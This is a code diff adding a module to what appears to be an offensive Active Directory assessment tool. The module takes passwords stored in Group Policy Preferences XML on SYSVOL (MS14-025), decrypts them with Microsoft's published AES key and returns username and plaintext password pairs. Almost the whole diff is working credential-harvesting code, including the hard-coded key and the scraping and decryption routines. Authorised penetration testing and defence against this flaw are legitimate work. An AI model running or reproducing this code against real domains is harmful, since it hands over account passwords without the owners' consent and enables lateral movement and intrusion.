@@ -33,6 +33,7 @@ USE WITH EXPLICIT WRITTEN AUTHORIZATION.
 """
 
 import argparse
+import base64
 import cmd
 import os
 import sys
@@ -514,6 +515,79 @@ def detect_services(ip: str) -> Dict[str, bool]:
     else:
         svcs["Exchange"] = False
     return svcs
+
+# ──────────────────────────────────────────────────────────────────────────────
+# GPP CPASSWORD DECRYPTION (CVE-2014-1812 / MS14-025)
+# ──────────────────────────────────────────────────────────────────────────────
+# Group Policy Preferences could store local-account/scheduled-task passwords
+# in SYSVOL-readable XML (Groups.xml, ScheduledTasks.xml, Services.xml, ...)
+# AES-256-CBC-encrypted with a key Microsoft published themselves in the GPP
+# documentation, so administrators could decrypt their own policy files. Any
+# authenticated domain user can read SYSVOL, so a published key means any
+# `cpassword` found there is trivially reversible — that fact is the entire
+# point of MS14-025, and this exact key/decrypt is standard across GPP-aware
+# tooling (PowerSploit's Get-GPPPassword, CrackMapExec's gpp_passwords module,
+# Metasploit's smb_enum_gpp, etc). This only decrypts a value already readable
+# by anyone with ordinary SYSVOL access; it does not touch the target itself.
+
+GPP_AES_KEY = bytes.fromhex(
+    "4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b"
+)
+
+def decrypt_gpp_cpassword(cpassword: str) -> str:
+    """Decrypt a GPP `cpassword` attribute value using Microsoft's published
+    static AES-256-CBC key. Returns "" on malformed/empty input rather than
+    raising, since callers typically feed this untrusted XML scraped from
+    SYSVOL rather than a value they've already validated."""
+    if not cpassword:
+        return ""
+    try:
+        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+    except ImportError:
+        err("cryptography not installed — run: pip install cryptography>=41.0.0")
+        return ""
+
+    padded = cpassword.replace("-", "+").replace("_", "/")
+    padded += "=" * (-len(padded) % 4)
+    try:
+        encrypted = base64.b64decode(padded)
+    except Exception as exc:
+        warn(f"Could not base64-decode cpassword: {exc}")
+        return ""
+    if not encrypted or len(encrypted) % 16 != 0:
+        warn("cpassword ciphertext is not a multiple of the AES block size — skipping.")
+        return ""
+
+    decryptor = Cipher(algorithms.AES(GPP_AES_KEY), modes.CBC(b"\x00" * 16)).decryptor()
+    try:
+        decrypted = decryptor.update(encrypted) + decryptor.finalize()
+    except Exception as exc:
+        warn(f"AES decryption failed: {exc}")
+        return ""
+
+    pad_len = decrypted[-1]
+    if 1 <= pad_len <= 16:
+        decrypted = decrypted[:-pad_len]
+    return decrypted.decode("utf-16-le", errors="replace")
+
+def extract_gpp_credentials(xml_text: str) -> List[Dict[str, str]]:
+    """Pull every (userName, cpassword) pair out of a GPP XML blob (Groups.xml,
+    ScheduledTasks.xml, etc.) and decrypt each cpassword found. Best-effort,
+    attribute-order-independent regex scrape — good enough for SYSVOL XML,
+    not a general-purpose XML parser."""
+    creds = []
+    for tag_match in re.finditer(r"<[^>]*cpassword=[\"'][^\"']*[\"'][^>]*>", xml_text):
+        tag = tag_match.group(0)
+        cpw_match = re.search(r'cpassword=["\']([^"\']*)["\']', tag)
+        user_match = re.search(r'(?:userName|runAs)=["\']([^"\']*)["\']', tag)
+        cpassword = cpw_match.group(1) if cpw_match else ""
+        if not cpassword:
+            continue
+        creds.append({
+            "username": user_match.group(1) if user_match else "",
+            "password": decrypt_gpp_cpassword(cpassword),
+        })
+    return creds
 
 # ──────────────────────────────────────────────────────────────────────────────
 # PHASE WRAPPER
